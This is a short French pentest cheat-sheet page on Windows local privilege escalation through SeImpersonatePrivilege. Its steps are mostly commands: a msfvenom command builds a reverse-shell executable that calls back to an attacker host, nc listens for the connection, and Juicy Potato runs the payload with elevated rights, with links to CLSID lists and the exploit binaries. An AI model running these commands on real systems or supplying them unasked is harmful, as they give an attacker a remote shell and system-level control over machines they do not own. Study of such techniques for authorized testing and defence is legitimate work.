# SeImpersonatePrivilege

Lorsque les privilèges sont trop permissifs, il est possible d'élever ses privilèges localement.

<pre><code><strong># whoami /priv
</strong>
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

</code></pre>

Sur la machine d'attaque, créer un reverse-shell et mettre en place un port en écoute pour recevoir sa connexion.

<pre><code><strong># msfvenom -p windows/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe -o &#x3C;FILE>.exe
</strong><strong># nc -lvp &#x3C;PORT></strong></code></pre>

Ensuite exécuter JuicyPatato sur la machine victime.

```
# Juicy.Potato.x86.exe -l 80 -p C:\<PATH>\<FILE>.exe -t * -c <CLSID>
```

Liste des CLSID : [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

Binaires JuicyPatato : [Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases) et [Juicy-Potato-x64](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
